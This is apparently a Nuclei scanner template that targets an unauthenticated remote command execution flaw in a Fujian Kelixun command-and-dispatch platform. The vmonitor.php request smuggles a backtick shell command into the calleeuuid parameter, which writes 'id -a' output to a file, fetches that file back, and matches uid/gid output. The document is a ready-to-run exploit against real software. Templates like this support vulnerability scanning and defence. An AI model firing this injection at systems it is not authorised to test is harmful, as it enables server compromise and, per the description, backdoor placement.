id: klx-vmonitor-rce

info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 福建科立讯通信有限公司指挥调度管理平台vmonitor.php、invite2videoconf.php、等接口处存在远程命令执行漏洞，未经身份认证的攻击者可通给该漏洞远程执行命令，写入后门文件可导致服务器失陷。
  reference:
    - http://kpanda.wiki/#/Vulnhub/F2-8%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1-%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-RCE?id=f2-8%e7%a6%8f%e5%bb%ba%e7%a7%91%e7%ab%8b%e8%ae%af%e9%80%9a%e4%bf%a1-%e6%8c%87%e6%8c%a5%e8%b0%83%e5%ba%a6%e7%ae%a1%e7%90%86%e5%b9%b3%e5%8f%b0-rce
  tags: tags
variables:
  filename: "{{rand_base(6)}}" 
  
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/client/vmonitor.php?extension=1&calleeuuid=`id%20-a>{{filename}}.txt`"
      - "{{BaseURL}}/api/client/{{filename}}.txt"
    matchers:
      - type: regex
        part: body
        regex:
          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'